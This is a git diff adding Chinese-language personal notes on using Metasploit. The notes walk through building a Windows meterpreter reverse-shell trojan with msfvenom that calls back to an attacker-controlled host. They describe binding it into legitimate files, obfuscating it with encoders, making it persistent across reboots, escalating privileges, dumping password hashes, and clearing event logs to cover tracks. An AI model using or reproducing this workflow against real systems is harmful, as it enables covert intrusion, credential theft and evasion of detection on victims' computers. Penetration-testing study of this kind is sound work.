@@ -164,30 +164,87 @@
 1. 甚麼是SSRF
     - SSRF(Server-Side Request Forgery)服務端請求偽造    
 
+## 參考資料
+- https://www.youtube.com/playlist?list=PLgZqc0esdeS-NJms7NYexeMHKLpfAi5HY
+
 # Metasploit
 - kali Linux 自帶的後門木馬管理工具
 
-## 啟動Metasploit
+## 操作流程
+
+### 1. 啟動Metasploit
 ```cmd
 msfconsole
 ```
 - -q 省略開啟時的文字訊息
 
-## 使用模組
+### 2. 使用模組
 ```cmd
 use exploit/multi/handler
 ```
 - 可以透過 show options 展示當前配置
 
-## 設置模組
+### 3. 設置模組
 ```cmd
 set lhost ip
 set lport port (默認4444)
 set payload (payload)
+set exitonsession false: 支持多線呈操作
 ```
 - 透過 show payloads 展示所有可用payload
 
-## 製作木馬
+### 4. 製作木馬
 ```cmd
 msfvenom -p windows/x64/meterpeter/reverse_tcp -f exe -a x64 --platform windows -o ./demo.exe lhost=ip lport=port 
 ```
+- -p: payload 使用的漏洞
+- -f: file 輸出格式
+- -o: output 輸出路徑
+- -x: 綑綁文件路徑(綑綁正常文件，當目標使用該檔案後就會開啟程序)
+- -k: Keep 維持原綑綁文件功能，同時間執行木馬程序
+- -e: encoder 利用混淆器
+- -i: 混淆次數
+- payload、lhost、lport必須與設置的一樣
+- msfvenom -h: 協助文件
+- msfvenom -l (預查詢指令): 將需要查詢的命令list值
+
+    #### todo: 製作自動化木馬生成工具
+    - 參考資料: https://www.youtube.com/watch?v=40yitejayBQ&list=PLgZqc0esdeS9UyK_QPoCO5wIZ_XYAkCV5&index=4
+
+    #### 補充-DLL劫持
+    - https://www.youtube.com/watch?v=9V-Z1PPuVcg&list=PLgZqc0esdeS9UyK_QPoCO5wIZ_XYAkCV5&index=8
+
+### 5. 啟動監聽
+```cmd
+run 
+```
+- run -j: 背景監聽
+- jobs: 顯示當前上線啟用程序的電腦列表
+- jobs -h: 操作命令列表
+- session -i (id): 選中操控的電腦(透過id)
+- background/bg: 退出選中回到背景
+- jobs -K: 關閉監聽
+
+### MSF木馬持久化
+- show advanced: 顯示高級指令
+- 第一次連線完成後: 出現 meterpreter > 後執行以下指令
+```cmd
+run persistence -X
+```
+- -X: 開機後自動啟動木馬
+- -i: 目標每隔幾秒自動連線
+
+## 連線後操作
+- help: 列出全部操作指令
+- getsystem: 提權 / rev2self: 改回使用者權限
+    - run post/windows/gather/hashdump: dump該裝置目前使用者權限以及密碼 hash值
+- 離開操作前記得把日誌刪掉: clearev 指令
+- portfwd: 端口轉發，將目標機台的某個端口轉到其他設備端口連接
+
+## MSF連接多個木馬
+- sessions: 觀看當前有多少電腦啟用程序
+
+
+## 參考資料: 
+- https://www.youtube.com/playlist?list=PLgZqc0esdeS9UyK_QPoCO5wIZ_XYAkCV5
+
